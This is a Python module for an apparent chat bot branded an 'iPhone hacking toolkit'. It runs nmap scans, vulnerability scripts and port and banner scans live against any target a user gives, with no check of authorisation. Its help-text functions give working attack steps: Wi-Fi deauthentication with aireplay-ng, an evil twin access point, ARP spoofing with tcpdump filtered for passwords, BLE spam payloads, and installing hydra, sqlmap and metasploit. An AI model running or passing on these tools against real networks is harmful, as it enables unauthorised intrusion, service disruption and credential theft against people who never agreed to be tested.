import subprocess
import socket
import re
import asyncio
from concurrent.futures import ThreadPoolExecutor

_executor = ThreadPoolExecutor(max_workers=4)

# ---- Input validation ----

def _safe_target(target):
    """Validate target is an IP, CIDR, or hostname - no command injection."""
    target = target.strip()
    if not target:
        return None
    if re.match(r'^[a-zA-Z0-9\.\-]+(/\d{1,2})?$', target) and len(target) < 256:
        return target
    return None


def _run(cmd, timeout=60):
    """Run a command and return stdout+stderr."""
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        out = (r.stdout + r.stderr).strip()
        return out[:3500] if out else "(no output)"
    except subprocess.TimeoutExpired:
        return "(timed out)"
    except Exception as e:
        return f"(error: {e})"


async def _arun(cmd, timeout=60):
    """Run a command async."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_executor, lambda: _run(cmd, timeout))


# ---- Network scanning (LIVE) ----

async def network_scan(target):
    """Run nmap service + version scan on target."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet <ip or hostname>\nExample: /phonenet 192.168.1.1"
    return await _arun(["nmap", "-sV", "-T4", "--open", t], timeout=120)


async def network_discover(target):
    """Ping sweep to find live hosts on a subnet."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonescan <subnet>\nExample: /phonescan 192.168.1.0/24"
    return await _arun(["nmap", "-sn", "-T4", t], timeout=90)


async def port_scan(target, ports=None):
    """Scan specific ports or top 1000."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet <ip> [ports]\nExample: /phonenet 192.168.1.1 80,443,22"
    cmd = ["nmap", "-sV", "-T4", "--open"]
    if ports:
        safe_ports = re.sub(r'[^0-9,\-]', '', ports)
        cmd += ["-p", safe_ports]
    cmd.append(t)
    return await _arun(cmd, timeout=120)


async def vuln_scan(target):
    """Run nmap vulnerability scripts against target."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonescan vuln <ip>\nExample: /phonescan vuln 192.168.1.1"
    return await _arun(["nmap", "-sV", "--script", "vuln", "-T4", t], timeout=180)


# ---- DNS / WHOIS (LIVE) ----

async def dns_lookup(target):
    """DNS lookup on target."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet dns <domain>\nExample: /phonenet dns google.com"
    results = []
    for qtype in ["A", "AAAA", "MX", "NS", "TXT"]:
        out = await _arun(["dig", "+short", t, qtype], timeout=10)
        if out and out != "(no output)":
            results.append(f"[{qtype}] {out}")
    return "\n".join(results) if results else f"No DNS records for {t}"


async def whois_lookup(target):
    """WHOIS lookup."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet whois <ip or domain>"
    return await _arun(["whois", t], timeout=15)


async def traceroute(target):
    """Traceroute to target."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet trace <ip or domain>"
    return await _arun(["traceroute", "-m", "15", "-w", "2", t], timeout=30)


# ---- Port connect / banner grab (LIVE) ----

async def banner_grab(target, port=80):
    """Grab service banner from a port."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet banner <ip> <port>"
    def _grab():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((t, int(port)))
            s.sendall(b"HEAD / HTTP/1.0\r\nHost: " + t.encode() + b"\r\n\r\n")
            data = s.recv(2048).decode(errors='replace')
            s.close()
            return data.strip() or "(no banner)"
        except Exception as e:
            return f"(error: {e})"
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_executor, _grab)


# ---- Python port scanner (LIVE, no nmap needed) ----

async def quick_port_scan(target):
    """Fast Python port scan of common ports."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet quick <ip>"
    common = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,
              1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
    def _scan():
        results = [f"Quick scan: {t}"]
        for p in common:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                if s.connect_ex((t, p)) == 0:
                    try: svc = socket.getservbyport(p)
                    except: svc = "?"
                    results.append(f"  {p}/tcp  OPEN  ({svc})")
                s.close()
            except:
                pass
        if len(results) == 1:
            results.append("  No open ports found (or host is down)")
        return "\n".join(results)
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_executor, _scan)


# ---- HTTP recon (LIVE) ----

async def http_headers(target):
    """Grab HTTP headers from a web server."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet http <domain or ip>"
    return await _arun(["curl", "-sI", "-m", "10", f"http://{t}"], timeout=15)


# ---- Ping (LIVE) ----

async def ping_host(target):
    """Ping a host."""
    t = _safe_target(target)
    if not t:
        return "Usage: /phonenet ping <ip>"
    return await _arun(["ping", "-c", "4", "-W", "2", t], timeout=15)


# ---- All-in-one dispatcher ----

async def phone_exec(args_str):
    """Parse command and dispatch to the right tool.
    
    Formats:
      /phonenet <ip>                    → nmap service scan
      /phonenet <ip> <ports>            → port scan
      /phonenet scan <subnet>           → ping sweep / discover
      /phonenet vuln <ip>               → vuln scan
      /phonenet dns <domain>            → DNS lookup
      /phonenet whois <domain>          → WHOIS
      /phonenet trace <ip>              → traceroute
      /phonenet ping <ip>               → ping
      /phonenet banner <ip> <port>      → banner grab
      /phonenet quick <ip>              → fast python port scan
      /phonenet http <domain>           → HTTP headers
    """
    parts = args_str.strip().split()
    if not parts:
        return (
            "NETWORK TOOLS (live execution)\n\n"
            "/phonenet <ip>              - nmap scan\n"
            "/phonenet scan <subnet/24>  - discover hosts\n"
            "/phonenet vuln <ip>         - vulnerability scan\n"
            "/phonenet dns <domain>      - DNS records\n"
            "/phonenet whois <domain>    - WHOIS lookup\n"
            "/phonenet trace <ip>        - traceroute\n"
            "/phonenet ping <ip>         - ping\n"
            "/phonenet banner <ip> <port>- banner grab\n"
            "/phonenet quick <ip>        - fast port scan\n"
            "/phonenet http <domain>     - HTTP headers\n"
            "/phonescan <subnet/24>      - host discovery\n"
            "/phonescan vuln <ip>        - vuln scan"
        )

    mode = parts[0].lower()
    target = parts[1] if len(parts) > 1 else parts[0]

    if mode == "scan":
        return await network_discover(target)
    elif mode == "vuln":
        return await vuln_scan(target)
    elif mode == "dns":
        return await dns_lookup(target)
    elif mode == "whois":
        return await whois_lookup(target)
    elif mode == "trace":
        return await traceroute(target)
    elif mode == "ping":
        return await ping_host(target)
    elif mode == "banner":
        port = parts[2] if len(parts) > 2 else "80"
        return await banner_grab(target, port)
    elif mode == "quick":
        return await quick_port_scan(target)
    elif mode == "http":
        return await http_headers(target)
    else:
        # mode is actually the target IP
        ports = parts[1] if len(parts) > 1 else None
        if ports and re.match(r'^[\d,\-]+$', ports):
            return await port_scan(mode, ports)
        return await network_scan(mode)


# ---- BLE info (can't execute from server - no hardware) ----

def ble_scan_script():
    return (
        "BLE TOOLS (run from iPhone)\n\n"
        "Server has no Bluetooth hardware.\n"
        "Use these apps on your iPhone:\n\n"
        "1. nRF Connect > Advertiser tab\n"
        "   - BLE spam: add custom manufacturer data\n"
        "   - Apple AirDrop: 4C 00 07 19 01 40 44 00 00 00 00 00 00 00 00\n"
        "   - Google Fast Pair: Type 0x16, UUID 0xFE2C, Data 00 XX XX\n"
        "   - Windows Swift Pair: Type 0xFF, Data 06 00 03 00 80\n"
        "   - Set interval 20ms, tap Start\n\n"
        "2. LightBlue Explorer\n"
        "   - Scans all BLE devices nearby\n"
        "   - Connect + read/write GATT characteristics\n\n"
        "3. nRF Connect > Scanner tab\n"
        "   - Raw advertisement packets + RSSI"
    )


def nfc_phone_script():
    return (
        "NFC TOOLS (run from iPhone 7+)\n\n"
        "1. Shortcuts app > Automation > NFC\n"
        "   Hold phone to tag > set auto-actions\n\n"
        "2. NFC Tools app (free)\n"
        "   READ: hold phone to any NFC tag\n"
        "   WRITE: URL, text, WiFi, vCard\n"
        "   Supports NTAG213/215/216\n\n"
        "3. TagWriter by NXP\n"
        "   Write NDEF + lock tags"
    )


def wifi_deauth_script():
    return (
        "WIFI DEAUTH\n\n"
        "iOS locks WiFi chip - no monitor mode.\n"
        "Need: Raspberry Pi + Alfa AWUS036ACH\n\n"
        "SSH from Termius to Pi, then run:\n"
        "  airmon-ng start wlan1\n"
        "  airodump-ng wlan1mon\n"
        "  aireplay-ng --deauth 500 -a <BSSID> wlan1mon"
    )


def wifi_evil_twin_script():
    return (
        "EVIL TWIN AP\n\n"
        "Need: Raspberry Pi + USB WiFi adapter\n"
        "SSH from Termius to Pi, then run:\n"
        "  hostapd + dnsmasq + captive portal\n\n"
        "Use /sshtools for SSH setup guide"
    )


def ir_blaster_script():
    return (
        "IR TOOLS\n\n"
        "iPhone has NO IR chip.\n"
        "Use Flipper Zero:\n"
        "  1. Install Flipper Mobile App (App Store)\n"
        "  2. Pair via Bluetooth\n"
        "  3. Trigger IR from iPhone app"
    )


def phone_jammer_info():
    return (
        "SIGNAL FREQUENCIES\n\n"
        "iPhone radios: WiFi 2.4+5GHz, BLE 2.4GHz, NFC 13.56MHz, LTE/5G, UWB\n\n"
        "Flipper Zero targets:\n"
        "  Garage doors: 433.92MHz (EU) / 315MHz (US)\n"
        "  Car fobs: 315/433/868MHz\n"
        "  Z-Wave: 908MHz (US) / 868MHz (EU)\n"
        "  RFID: 125kHz\n"
        "  NFC: 13.56MHz"
    )


def ssh_remote_tools():
    return (
        "SSH REMOTE EXECUTION\n\n"
        "SSH from Termius app to a VPS/Pi running Kali.\n\n"
        "Free VPS: Oracle Cloud (4 CPU + 24GB RAM free forever)\n"
        "  oracle.com/cloud/free\n\n"
        "Setup on VPS:\n"
        "  apt install -y nmap metasploit-framework aircrack-ng hydra sqlmap\n\n"
        "SSH key in iSH:\n"
        "  ssh-keygen -t rsa -b 4096\n"
        "  cat ~/.ssh/id_rsa.pub  (add to VPS authorized_keys)"
    )


def phone_setup_guide():
    return (
        "iPHONE SETUP\n\n"
        "NETWORK TOOLS RUN LIVE FROM THIS BOT!\n"
        "Just type: /phonenet <target ip>\n\n"
        "For local tools, install:\n"
        "  iSH Shell - Alpine Linux (nmap, hydra)\n"
        "  LightBlue - BLE scanner\n"
        "  nRF Connect - BLE spam + scan\n"
        "  NFC Tools - NFC read/write\n"
        "  Fing - network scanner\n"
        "  Termius - SSH to VPS/Pi"
    )


def ish_setup_script():
    return (
        "iSH SETUP (paste in iSH app)\n\n"
        "apk update && apk upgrade\n"
        "apk add nmap python3 py3-pip hydra john\n"
        "apk add curl wget git openssh-client netcat-openbsd\n"
        "pip3 install requests scapy impacket"
    )


def arp_spoof_script():
    return (
        "ARP SPOOF / MITM\n\n"
        "Needs Raspberry Pi on target network.\n"
        "SSH from Termius to Pi:\n"
        "  echo 1 > /proc/sys/net/ipv4/ip_forward\n"
        "  arpspoof -i wlan0 -t TARGET GATEWAY &\n"
        "  arpspoof -i wlan0 -t GATEWAY TARGET &\n"
        "  tcpdump -i wlan0 -A | grep password"
    )


def wifi_scan_script():
    return (
        "WiFi scan uses nmap from this server.\n"
        "Use: /phonenet scan <subnet/24>\n"
        "Or:  /phonenet <target ip>"
    )


def packet_sniffer_script():
    return (
        "PACKET CAPTURE\n\n"
        "From Mac: rvictl -s <iPhone-UDID> > Wireshark on rvi0\n"
        "App Store: 'Network Packet Capture' (creates local VPN)\n"
        "Proxy: Proxyman/Burp on Mac + set iPhone HTTP proxy"
    )


def phone_full_toolkit():
    return (
        "iPHONE HACKING TOOLKIT\n\n"
        "LIVE from this bot (just type commands):\n"
        "  /phonenet <ip>         - nmap scan target\n"
        "  /phonenet scan <sub>   - discover hosts\n"
        "  /phonenet vuln <ip>    - vulnerability scan\n"
        "  /phonenet dns <domain> - DNS lookup\n"
        "  /phonenet whois <dom>  - WHOIS\n"
        "  /phonenet trace <ip>   - traceroute\n"
        "  /phonenet ping <ip>    - ping\n"
        "  /phonenet quick <ip>   - fast port scan\n"
        "  /phonenet http <dom>   - HTTP headers\n"
        "  /phonescan <subnet>    - host discovery\n"
        "  /phonescan vuln <ip>   - vuln scan\n\n"
        "iPhone apps (BLE/NFC - needs local hardware):\n"
        "  /phoneble   - BLE spam/scan guide\n"
        "  /phonenfc   - NFC tools guide\n"
        "  /phoneir    - IR tools guide\n"
        "  /sshtools   - SSH remote execution"
    )
